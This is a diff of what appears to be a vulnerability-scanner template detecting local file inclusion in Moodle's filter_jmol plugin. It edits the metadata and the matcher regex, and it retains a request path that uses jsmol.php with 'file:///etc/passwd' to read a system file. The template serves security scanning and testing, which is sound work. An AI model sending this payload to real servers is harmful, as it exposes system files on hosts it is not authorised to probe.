@@ -1,13 +1,11 @@
 id: moodle-filter-jmol-lfi
 
 info:
-  name: Moodle filter_jmol - LFI
+  name: Moodle filter_jmol LFI
   author: madrobot
   severity: high
-  description: Local file inclusion on Moodle.
-  tags: moodle,lfi
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd"
@@ -18,5 +16,5 @@ http:
           - 200
       - type: regex
         regex:
-          - "root:.*:0:0:"
+          - "root:[x*]:0:0:"
         part: body
